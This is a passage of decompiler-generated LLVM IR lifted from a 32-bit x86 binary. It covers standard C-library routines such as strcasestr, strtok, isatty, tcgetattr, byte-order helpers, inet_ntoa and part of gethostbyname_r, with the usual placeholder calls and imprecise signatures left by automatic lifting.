  %v0_804f9c7 = phi i32 [ %arg2, %entry ], [ %v1_804f9c7, %dec_label_pc_804f9c7 ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804f9aa = icmp eq i32 %v0_804f9c8, %v0_804f9c7
  %.pre = inttoptr i32 %v0_804f9c8 to i8*
  br i1 %v12_804f9aa, label %dec_label_pc_804f9c2, label %dec_label_pc_804f9ae

dec_label_pc_804f9ae:                             ; preds = %dec_label_pc_804f9aa
  %v2_804f9ae = load i8, i8* %.pre, align 1
  %v3_804f9ae = zext i8 %v2_804f9ae to i32
  %v2_804f9b1 = mul nuw nsw i32 %v3_804f9ae, 2
  %v3_804f9b1 = add i32 %v2_804f9b1, %v0_804f999
  %v4_804f9b1 = inttoptr i32 %v3_804f9b1 to i16*
  %v5_804f9b1 = load i16, i16* %v4_804f9b1, align 2
  %v6_804f9b1 = sext i16 %v5_804f9b1 to i32
  %v1_804f9b5 = inttoptr i32 %v0_804f9c7 to i8*
  %v2_804f9b5 = load i8, i8* %v1_804f9b5, align 1
  %v3_804f9b5 = zext i8 %v2_804f9b5 to i32
  %v2_804f9b8 = mul nuw nsw i32 %v3_804f9b5, 2
  %v3_804f9b8 = add i32 %v2_804f9b8, %v0_804f999
  %v4_804f9b8 = inttoptr i32 %v3_804f9b8 to i16*
  %v5_804f9b8 = load i16, i16* %v4_804f9b8, align 2
  %v6_804f9b8 = sext i16 %v5_804f9b8 to i32
  %v2_804f9bc = sub nsw i32 %v6_804f9b1, %v6_804f9b8
  %v12_804f9bc = icmp eq i32 %v2_804f9bc, 0
  store i32 %v2_804f9bc, i32* @edx, align 4
  %v1_804f9c0 = icmp eq i1 %v12_804f9bc, false
  br i1 %v1_804f9c0, label %dec_label_pc_804f9cb, label %dec_label_pc_804f9c2

dec_label_pc_804f9c2:                             ; preds = %dec_label_pc_804f9aa, %dec_label_pc_804f9ae
  %v0_804f9cd7 = phi i32 [ %v2_804f9bc, %dec_label_pc_804f9ae ], [ %v0_804f9cd6, %dec_label_pc_804f9aa ]
  %v2_804f9c2 = load i8, i8* %.pre, align 1
  %v3_804f9c2 = icmp eq i8 %v2_804f9c2, 0
  br i1 %v3_804f9c2, label %dec_label_pc_804f9cb, label %dec_label_pc_804f9c7

dec_label_pc_804f9c7:                             ; preds = %dec_label_pc_804f9c2
  %v1_804f9c7 = add i32 %v0_804f9c7, 1
  %v1_804f9c8 = add i32 %v0_804f9c8, 1
  br label %dec_label_pc_804f9aa

dec_label_pc_804f9cb:                             ; preds = %dec_label_pc_804f9c2, %dec_label_pc_804f9ae
  %v0_804f9cd = phi i32 [ %v0_804f9cd7, %dec_label_pc_804f9c2 ], [ %v2_804f9bc, %dec_label_pc_804f9ae ]
  ret i32 %v0_804f9cd

; uselistorder directives
  uselistorder i32 %v1_804f9c8, { 1, 0 }
  uselistorder i32 %v0_804f9cd7, { 1, 0 }
  uselistorder i32 %v2_804f9bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f9c7, { 1, 2, 0 }
  uselistorder i32 %v0_804f9c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9c2, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f9d3 = load i32, i32* @ebx, align 4
  %v4_804f9d7 = ptrtoint i8* %arg1 to i32
  %v1_804f9e318 = inttoptr i32 %arg2 to i8*
  %v2_804f9e31932 = load i8, i8* %v1_804f9e318, align 1
  %v4_804f9e52336 = icmp eq i8 %v2_804f9e31932, 0
  %v1_804f9e72538 = icmp eq i1 %v4_804f9e52336, false
  br i1 %v1_804f9e72538, label %dec_label_pc_804f9ed.lr.ph.lr.ph, label %dec_label_pc_804fa1d

dec_label_pc_804f9ed.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804f9e32033 = zext i8 %v2_804f9e31932 to i32
  %v4_804f9e3.pre.pre = load i32, i32* @eax, align 4
  %v5_804f9e32134 = and i32 %v4_804f9e3.pre.pre, -256
  %v6_804f9e32235 = or i32 %v3_804f9e32033, %v5_804f9e32134
  %v4_804f9ed.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f9ed.lr.ph

dec_label_pc_804f9ed.lr.ph:                       ; preds = %dec_label_pc_804f9ed.lr.ph.lr.ph, %dec_label_pc_804fa18
  %v4_804f9ed.pre = phi i32 [ %v4_804f9ed.pre.pre, %dec_label_pc_804f9ed.lr.ph.lr.ph ], [ %v0_804f9f7, %dec_label_pc_804fa18 ]
  %v6_804f9e32241 = phi i32 [ %v6_804f9e32235, %dec_label_pc_804f9ed.lr.ph.lr.ph ], [ %v6_804f9e322, %dec_label_pc_804fa18 ]
  %v2_804f9e31940 = phi i8 [ %v2_804f9e31932, %dec_label_pc_804f9ed.lr.ph.lr.ph ], [ %v2_804f9e319, %dec_label_pc_804fa18 ]
  %v0_804fa1839 = phi i32 [ %v4_804f9d7, %dec_label_pc_804f9ed.lr.ph.lr.ph ], [ %v1_804fa18, %dec_label_pc_804fa18 ]
  br label %dec_label_pc_804f9ed

dec_label_pc_804f9ed:                             ; preds = %dec_label_pc_804f9ed.lr.ph, %dec_label_pc_804fa0d
  %v4_804f9ed = phi i32 [ %v4_804f9ed.pre, %dec_label_pc_804f9ed.lr.ph ], [ %v4_804f9ed46, %dec_label_pc_804fa0d ]
  %v6_804f9e330 = phi i32 [ %v6_804f9e32241, %dec_label_pc_804f9ed.lr.ph ], [ %v6_804f9e3, %dec_label_pc_804fa0d ]
  %v2_804f9e329 = phi i8 [ %v2_804f9e31940, %dec_label_pc_804f9ed.lr.ph ], [ %v2_804f9e3, %dec_label_pc_804fa0d ]
  %v1_804f9e328 = phi i8* [ %v1_804f9e318, %dec_label_pc_804f9ed.lr.ph ], [ %v1_804f9e3, %dec_label_pc_804fa0d ]
  %v0_804fa0d27 = phi i32 [ %arg2, %dec_label_pc_804f9ed.lr.ph ], [ %v1_804fa0d, %dec_label_pc_804fa0d ]
  %v0_804fa0e26 = phi i32 [ %v0_804fa1839, %dec_label_pc_804f9ed.lr.ph ], [ %v1_804fa0e, %dec_label_pc_804fa0d ]
  %v1_804f9ed = inttoptr i32 %v0_804fa0e26 to i8*
  %v2_804f9ed = load i8, i8* %v1_804f9ed, align 1
  %v3_804f9ed = zext i8 %v2_804f9ed to i32
  %v5_804f9ed = and i32 %v4_804f9ed, -256
  %v6_804f9ed = or i32 %v5_804f9ed, %v3_804f9ed
  %v15_804f9ef = icmp eq i8 %v2_804f9e329, %v2_804f9ed
  br i1 %v15_804f9ef, label %dec_label_pc_804fa0d, label %dec_label_pc_804f9f7

dec_label_pc_804f9f7:                             ; preds = %dec_label_pc_804f9ed
  %v0_804f9f7 = load i32, i32* bitcast (i32** @global_var_805a6a0.178 to i32*), align 32
  %v2_804f9fd = load i8, i8* %v1_804f9ed, align 1
  %v3_804f9fd = zext i8 %v2_804f9fd to i32
  %v2_804fa00 = load i8, i8* %v1_804f9e328, align 1
  %v3_804fa00 = zext i8 %v2_804fa00 to i32
  %v2_804fa03 = mul nuw nsw i32 %v3_804f9fd, 2
  %v3_804fa03 = add i32 %v2_804fa03, %v0_804f9f7
  %v4_804fa03 = inttoptr i32 %v3_804fa03 to i16*
  %v5_804fa03 = load i16, i16* %v4_804fa03, align 2
  %v6_804fa03 = zext i16 %v5_804fa03 to i32
  %v4_804fa07 = mul nuw nsw i32 %v3_804fa00, 2
  %v5_804fa07 = add i32 %v4_804fa07, %v0_804f9f7
  %v6_804fa07 = inttoptr i32 %v5_804fa07 to i16*
  %v7_804fa07 = load i16, i16* %v6_804fa07, align 2
  %v18_804fa07 = icmp eq i16 %v5_804fa03, %v7_804fa07
  %v1_804fa0b = icmp eq i1 %v18_804fa07, false
  br i1 %v1_804fa0b, label %dec_label_pc_804fa11, label %dec_label_pc_804fa0d

dec_label_pc_804fa0d:                             ; preds = %dec_label_pc_804f9f7, %dec_label_pc_804f9ed
  %v4_804f9ed46 = phi i32 [ %v0_804f9f7, %dec_label_pc_804f9f7 ], [ %v6_804f9ed, %dec_label_pc_804f9ed ]
  %v4_804f9e36 = phi i32 [ %v6_804fa03, %dec_label_pc_804f9f7 ], [ %v6_804f9e330, %dec_label_pc_804f9ed ]
  %v1_804fa0d = add i32 %v0_804fa0d27, 1
  %v1_804fa0e = add i32 %v0_804fa0e26, 1
  %v1_804f9e3 = inttoptr i32 %v1_804fa0d to i8*
  %v2_804f9e3 = load i8, i8* %v1_804f9e3, align 1
  %v3_804f9e3 = zext i8 %v2_804f9e3 to i32
  %v5_804f9e3 = and i32 %v4_804f9e36, -256
  %v6_804f9e3 = or i32 %v3_804f9e3, %v5_804f9e3
  %v4_804f9e5 = icmp eq i8 %v2_804f9e3, 0
  %v1_804f9e7 = icmp eq i1 %v4_804f9e5, false
  br i1 %v1_804f9e7, label %dec_label_pc_804f9ed, label %dec_label_pc_804fa1d

dec_label_pc_804fa11:                             ; preds = %dec_label_pc_804f9f7
  %v4_804fa11 = icmp eq i8 %v2_804f9ed, 0
  br i1 %v4_804fa11, label %dec_label_pc_804fa1b, label %dec_label_pc_804fa18

dec_label_pc_804fa18:                             ; preds = %dec_label_pc_804fa11
  %v1_804fa18 = add i32 %v0_804fa1839, 1
  %v2_804f9e319 = load i8, i8* %v1_804f9e318, align 1
  %v3_804f9e320 = zext i8 %v2_804f9e319 to i32
  %v5_804f9e321 = and i32 %v6_804fa03, 65280
  %v6_804f9e322 = or i32 %v3_804f9e320, %v5_804f9e321
  %v4_804f9e523 = icmp eq i8 %v2_804f9e319, 0
  %v1_804f9e725 = icmp eq i1 %v4_804f9e523, false
  br i1 %v1_804f9e725, label %dec_label_pc_804f9ed.lr.ph, label %dec_label_pc_804fa1d

dec_label_pc_804fa1b:                             ; preds = %dec_label_pc_804fa11
  br label %dec_label_pc_804fa1d

dec_label_pc_804fa1d:                             ; preds = %dec_label_pc_804fa18, %entry, %dec_label_pc_804fa0d, %dec_label_pc_804fa1b
  %storemerge = phi i32 [ 0, %dec_label_pc_804fa1b ], [ %v4_804f9d7, %entry ], [ %v1_804fa18, %dec_label_pc_804fa18 ], [ %v0_804fa1839, %dec_label_pc_804fa0d ]
  store i32 %v0_804f9d3, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804f9e319, { 1, 2, 0 }
  uselistorder i8 %v2_804f9e3, { 1, 2, 0 }
  uselistorder i8* %v1_804f9e3, { 1, 0 }
  uselistorder i32 %v0_804f9f7, { 1, 2, 3, 0 }
  uselistorder i8 %v2_804f9ed, { 1, 0, 2 }
  uselistorder i32 %v0_804fa0e26, { 1, 0 }
  uselistorder i8 %v2_804f9e31932, { 0, 2, 1 }
  uselistorder i8* %v1_804f9e318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fa1d, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804f9ed, { 1, 0 }
  uselistorder label %dec_label_pc_804f9ed.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804fa34 = inttoptr i32 %arg1 to i8*
  %v4_804fa34 = call i32 @strtok_r(i8* %v3_804fa34, i32 %arg2, i32 ptrtoint (i32* @global_var_8060720.179 to i32))
  ret i32 %v4_804fa34
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804fa4c = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804fa51 = icmp eq i32 %v3_804fa4c, 0
  %v1_804fa53 = zext i1 %v1_804fa51 to i32
  ret i32 %v1_804fa53
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fa60 = load i32, i32* @esi, align 4
  %v0_804fa61 = load i32, i32* @ebx, align 4
  store i32 %v0_804fa61, i32* %stack_var_-8, align 4
  %v2_804fa65 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fa65, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804fa77 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804fa65)
  store i32 %v3_804fa77, i32* %eax.global-to-local, align 4
  %v1_804fa7f = icmp eq i32 %v3_804fa77, 0
  store i32 %v3_804fa77, i32* @esi, align 4
  %v1_804fa83 = icmp eq i1 %v1_804fa7f, false
  br i1 %v1_804fa83, label %dec_label_pc_804fac8, label %dec_label_pc_804fa85

dec_label_pc_804fa85:                             ; preds = %entry
  %v3_804fa85 = load i32, i32* %stack_var_-44, align 4
  %v1_804fa89 = load i32, i32* @ebx, align 4
  %v2_804fa89 = inttoptr i32 %v1_804fa89 to i32*
  store i32 %v3_804fa85, i32* %v2_804fa89, align 4
  %v1_804fa8f = load i32, i32* @ebx, align 4
  %v2_804fa8f = add i32 %v1_804fa8f, 4
  %v3_804fa8f = inttoptr i32 %v2_804fa8f to i32*
  %v1_804fa96 = load i32, i32* @ebx, align 4
  %v2_804fa96 = add i32 %v1_804fa96, 8
  %v3_804fa96 = inttoptr i32 %v2_804fa96 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804fa9d = load i32, i32* @ebx, align 4
  %v2_804fa9d = add i32 %v1_804fa9d, 12
  %v3_804fa9d = inttoptr i32 %v2_804fa9d to i32*
  store i32 %tmp3, i32* %v3_804fa9d, align 4
  %v4_804faa0 = zext i8 %tmp to i32
  %v5_804faa0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804faa0 = and i32 %v5_804faa0, -256
  %v7_804faa0 = or i32 %v6_804faa0, %v4_804faa0
  store i32 %v7_804faa0, i32* %eax.global-to-local, align 4
  %v2_804faa4 = load i32, i32* @ebx, align 4
  %v3_804faa4 = add i32 %v2_804faa4, 16
  %v4_804faa4 = inttoptr i32 %v3_804faa4 to i8*
  store i8 %tmp, i8* %v4_804faa4, align 1
  %v0_804faa7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804faaa = ptrtoint i32* %stack_var_-27 to i32
  %v0_804faaf = load i32, i32* @ebx, align 4
  %v1_804faaf = add i32 %v0_804faaf, 17
  store i32 %v1_804faaf, i32* %eax.global-to-local, align 4
  %v4_804fab3 = call i32 @__GI_mempcpy(i32 %v1_804faaf, i32 %v2_804faaa, i32 19, i32 %v0_804faa7)
  store i32 %v4_804fab3, i32* %eax.global-to-local, align 4
  %v3_804fac0 = inttoptr i32 %v4_804fab3 to i8*
  %v4_804fac0 = call i32 @__GI_memset(i8* %v3_804fac0, i32 0, i32 13)
  store i32 %v4_804fac0, i32* %eax.global-to-local, align 4
  %v0_804facb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fac8

dec_label_pc_804fac8:                             ; preds = %entry, %dec_label_pc_804fa85
  %v0_804facb = phi i32 [ %v3_804fa77, %entry ], [ %v0_804facb.pre, %dec_label_pc_804fa85 ]
  store i32 %v0_804facb, i32* %eax.global-to-local, align 4
  %v2_804facd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804facd, i32* @ebx, align 4
  store i32 %v0_804fa60, i32* @esi, align 4
  ret i32 %v0_804facb

; uselistorder directives
  uselistorder i32 %v0_804facb, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fac8, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fad5 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fad5 = zext i16 %v3_804fad5 to i32
  ret i32 %v4_804fad5
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804fae1 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804fae1
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fae9 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fae9 = zext i16 %v3_804fae9 to i32
  ret i32 %v4_804fae9
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804faf5 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804faf5
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804faf8 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804fafb = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804fafe = load i32, i32* @ebx, align 4
  store i32 %v0_804fafe, i32* %stack_var_-12, align 4
  %v1_804fb07 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804fb07, 16777216
  %v1_804fb09 = sdiv i32 %sext, 16777216
  store i32 %v1_804fb09, i32* @ebx, align 4
  %v1_804fb0b = add i32 %arg2, 15
  store i32 %v1_804fb0b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fb10

dec_label_pc_804fb10:                             ; preds = %entry, %dec_label_pc_804fb35
  %v0_804fb1717 = phi i32 [ %v1_804fb09, %entry ], [ %v2_804fb35, %dec_label_pc_804fb35 ]
  %v0_804fb4116 = phi i32 [ %v1_804fb0b, %entry ], [ %v0_804fb39, %dec_label_pc_804fb35 ]
  %v1_804fb1b = urem i32 %v0_804fb1717, 256
  %v5_804fb23 = inttoptr i32 %v0_804fb4116 to i8*
  %v6_804fb23 = call i32 @_uintmaxtostr(i8* %v5_804fb23, i32 %v1_804fb1b, i32 0, i32 -10, i32 0)
  %v0_804fb2b = load i32, i32* @esi, align 4
  %v1_804fb2b = icmp eq i32 %v0_804fb2b, 0
  %v1_804fb2d = add i32 %v6_804fb23, -1
  store i32 %v1_804fb2d, i32* %ecx.global-to-local, align 4
  br i1 %v1_804fb2b, label %dec_label_pc_804fb35, label %dec_label_pc_804fb32

dec_label_pc_804fb32:                             ; preds = %dec_label_pc_804fb10
  %v1_804fb32 = inttoptr i32 %v0_804fb2b to i8*
  store i8 46, i8* %v1_804fb32, align 1
  %v0_804fb39.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fb35

dec_label_pc_804fb35:                             ; preds = %dec_label_pc_804fb10, %dec_label_pc_804fb32
  %v0_804fb39 = phi i32 [ %v1_804fb2d, %dec_label_pc_804fb10 ], [ %v0_804fb39.pre, %dec_label_pc_804fb32 ]
  %v0_804fb35 = load i32, i32* @ebx, align 4
  %v2_804fb35 = udiv i32 %v0_804fb35, 256
  store i32 %v2_804fb35, i32* @ebx, align 4
  %v0_804fb38 = load i32, i32* @edi, align 4
  %v1_804fb38 = add i32 %v0_804fb38, 1
  store i32 %v1_804fb38, i32* @edi, align 4
  store i32 %v0_804fb39, i32* @esi, align 4
  %v7_804fb3e = icmp sgt i32 %v1_804fb38, 3
  br i1 %v7_804fb3e, label %dec_label_pc_804fb40, label %dec_label_pc_804fb10

dec_label_pc_804fb40:                             ; preds = %dec_label_pc_804fb35
  %v2_804fb40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb40, i32* @ebx, align 4
  %v1_804fb41 = add i32 %v0_804fb39, 1
  store i32 %v0_804fafb, i32* @esi, align 4
  store i32 %v0_804faf8, i32* @edi, align 4
  ret i32 %v1_804fb41

; uselistorder directives
  uselistorder i32 %v0_804fb39, { 0, 2, 1 }
  uselistorder i32 %v1_804fb09, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb35, { 1, 0 }
  uselistorder label %dec_label_pc_804fb10, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804fb53 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8060724.180 to i32))
  ret i32 %v2_804fb53
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804fb5f = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fb68 = inttoptr i32 %arg1 to i8*
  %v3_804fb68 = call i32 @inet_aton(i8* %v2_804fb68, i32 %v2_804fb5f)
  %v1_804fb73 = icmp eq i32 %v3_804fb68, 0
  br i1 %v1_804fb73, label %dec_label_pc_804fb7b, label %dec_label_pc_804fb77

dec_label_pc_804fb77:                             ; preds = %entry
  %v3_804fb77 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb7b

dec_label_pc_804fb7b:                             ; preds = %entry, %dec_label_pc_804fb77
  %v0_804fb7b = phi i32 [ -1, %entry ], [ %v3_804fb77, %dec_label_pc_804fb77 ]
  ret i32 %v0_804fb7b

; uselistorder directives
  uselistorder label %dec_label_pc_804fb7b, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb87 = call i32 @__GI___h_errno_location()
  %v0_804fb8c = load i32, i32* @edx, align 4
  %v2_804fb8f = ptrtoint i32* %stack_var_-4 to i32
  %v9_804fba7 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806090c.182, i32 ptrtoint (i32* @global_var_8060740.181 to i32), i32 460, i32 %v2_804fb8f, i32 %v0_804fb87, i32 %v0_804fb8c, i32 %v0_804fb8c)
  %v3_804fbac = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804fbac
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804fbb4 = load i32, i32* @ebp, align 4
  %v0_804fbb5 = load i32, i32* @edi, align 4
  %v0_804fbb6 = load i32, i32* @esi, align 4
  %v0_804fbb7 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804fbc7 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804fbc7, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804fbd2 = icmp eq i32 %arg1, 0
  br i1 %v4_804fbd2, label %dec_label_pc_804fede, label %dec_label_pc_804fbdd

dec_label_pc_804fbdd:                             ; preds = %entry
  %v1_804fbdd = call i32 @__errno_location(i32 %v0_804fbb7)
  store i32 %v1_804fbdd, i32* %eax.global-to-local, align 4
  %v1_804fbe2 = inttoptr i32 %v1_804fbdd to i32*
  %v2_804fbe2 = load i32, i32* %v1_804fbe2, align 4
  store i32 %v2_804fbe2, i32* @edi, align 4
  store i32 %v1_804fbdd, i32* @esi, align 4
  store i32 0, i32* %v1_804fbe2, align 4
  %v0_804fbf5 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbf5, i32* %stack_var_-108, align 4
  %v7_804fc01 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804fbf5, i32 %arg5, i32 %arg6, i32 %v1_804fbdd)
  store i32 %v7_804fc01, i32* %eax.global-to-local, align 4
  %v1_804fc09 = icmp eq i32 %v7_804fc01, 0
  br i1 %v1_804fc09, label %dec_label_pc_804fede, label %dec_label_pc_804fc11

dec_label_pc_804fc11:                             ; preds = %dec_label_pc_804fbdd
  %v1_804fc15 = inttoptr i32 %arg6 to i32*
  %v2_804fc15 = load i32, i32* %v1_804fc15, align 4
  store i32 %v2_804fc15, i32* %edx.global-to-local, align 4
  %v9_804fc17 = icmp eq i32 %v2_804fc15, 1
  br i1 %v9_804fc17, label %dec_label_pc_804fc31, label %dec_label_pc_804fc1c

dec_label_pc_804fc1c:                             ; preds = %dec_label_pc_804fc11
  %v9_804fc1c = icmp eq i32 %v2_804fc15, 4
  br i1 %v9_804fc1c, label %dec_label_pc_804fc31, label %dec_label_pc_804fc21

dec_label_pc_804fc21:                             ; preds = %dec_label_pc_804fc1c
  %v1_804fc21 = add i32 %v2_804fc15, 1
  %v8_804fc21 = icmp eq i32 %v1_804fc21, 0
  store i32 %v1_804fc21, i32* %edx.global-to-local, align 4
  %v1_804fc22 = icmp eq i1 %v8_804fc21, false
  br i1 %v1_804fc22, label %dec_label_pc_804fede, label %dec_label_pc_804fc28

dec_label_pc_804fc28:                             ; preds = %dec_label_pc_804fc21
  %v0_804fc28 = load i32, i32* @esi, align 4
  %v1_804fc28 = inttoptr i32 %v0_804fc28 to i32*
  %v2_804fc28 = load i32, i32* %v1_804fc28, align 4
  %v11_804fc28 = icmp eq i32 %v2_804fc28, 2
  %v1_804fc2b = icmp eq i1 %v11_804fc28, false
  br i1 %v1_804fc2b, label %dec_label_pc_804fede, label %dec_label_pc_804fc31

dec_label_pc_804fc31:                             ; preds = %dec_label_pc_804fc28, %dec_label_pc_804fc1c, %dec_label_pc_804fc11
  %v0_804fc31 = load i32, i32* @ebp, align 4
  %v1_804fc33 = sub i32 0, %v0_804fc31
  %v1_804fc35 = urem i32 %v1_804fc33, 4
  %v2_804fc35 = icmp eq i32 %v1_804fc35, 0
  store i32 %v1_804fc35, i32* %eax.global-to-local, align 4
  %v0_804fc38 = load i32, i32* @edi, align 4
  %v1_804fc38 = load i32, i32* @esi, align 4
  %v2_804fc38 = inttoptr i32 %v1_804fc38 to i32*
  store i32 %v0_804fc38, i32* %v2_804fc38, align 4
  %v0_804fc4c.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804fc35, label %dec_label_pc_804fc48, label %dec_label_pc_804fc3c

dec_label_pc_804fc3c:                             ; preds = %dec_label_pc_804fc31
  %v1_804fc3c = load i32, i32* %eax.global-to-local, align 4
  %v2_804fc3c = sub i32 %v0_804fc4c.pre, %v1_804fc3c
  %v7_804fc3c = icmp ult i32 %v0_804fc4c.pre, %v1_804fc3c
  br i1 %v7_804fc3c, label %dec_label_pc_804fed9, label %dec_label_pc_804fc44

dec_label_pc_804fc44:                             ; preds = %dec_label_pc_804fc3c
  %v0_804fc44 = load i32, i32* @ebp, align 4
  %v2_804fc44 = add i32 %v0_804fc44, %v1_804fc3c
  store i32 %v2_804fc44, i32* @ebp, align 4
  store i32 %v2_804fc3c, i32* @ebx, align 4
  br label %dec_label_pc_804fc48

dec_label_pc_804fc48:                             ; preds = %dec_label_pc_804fc31, %dec_label_pc_804fc44
  %v0_804fc4c = phi i32 [ %v2_804fc3c, %dec_label_pc_804fc44 ], [ %v0_804fc4c.pre, %dec_label_pc_804fc31 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804fc15, align 4
  %tmp41 = icmp ult i32 %v0_804fc4c, 4
  br i1 %tmp41, label %dec_label_pc_804fed9, label %dec_label_pc_804fc5b

dec_label_pc_804fc5b:                             ; preds = %dec_label_pc_804fc48
  %v0_804fc5b = load i32, i32* @ebx, align 4
  %v1_804fc5b = add i32 %v0_804fc5b, -4
  store i32 %v1_804fc5b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804fc5b, 8
  br i1 %tmp42, label %dec_label_pc_804fed9, label %dec_label_pc_804fc67

dec_label_pc_804fc67:                             ; preds = %dec_label_pc_804fc5b
  %v1_804fc67 = add i32 %v0_804fc5b, -12
  store i32 %v1_804fc67, i32* %eax.global-to-local, align 4
  %v0_804fc6a = load i32, i32* @ebp, align 4
  %v1_804fc6a = add i32 %v0_804fc6a, 4
  store i32 %v1_804fc6a, i32* %edx.global-to-local, align 4
  store i32 %v1_804fc6a, i32* %stack_var_-92, align 4
  %v3_804fc73 = inttoptr i32 %v1_804fc6a to i32*
  store i32 %v0_804fc6a, i32* %v3_804fc73, align 4
  %v0_804fc76 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc76 = add i32 %v0_804fc76, 4
  %v2_804fc76 = inttoptr i32 %v1_804fc76 to i32*
  store i32 0, i32* %v2_804fc76, align 4
  %tmp43 = icmp ult i32 %v1_804fc67, 32
  br i1 %tmp43, label %dec_label_pc_804fed9, label %dec_label_pc_804fc83

dec_label_pc_804fc83:                             ; preds = %dec_label_pc_804fc67
  %v0_804fc83 = load i32, i32* @ebx, align 4
  %v1_804fc83 = add i32 %v0_804fc83, -44
  store i32 %v1_804fc83, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804fc83, 256
  br i1 %tmp44, label %dec_label_pc_804fed9, label %dec_label_pc_804fc96

dec_label_pc_804fc96:                             ; preds = %dec_label_pc_804fc83
  %v0_804fc96 = load i32, i32* @ebp, align 4
  %v1_804fc96 = add i32 %v0_804fc96, 12
  %v1_804fc9d = add i32 %v0_804fc96, 44
  store i32 %v1_804fc9d, i32* @edi, align 4
  store i32 %v1_804fc9d, i32* %stack_var_-108, align 4
  %v3_804fcaa = inttoptr i32 %v1_804fc9d to i8*
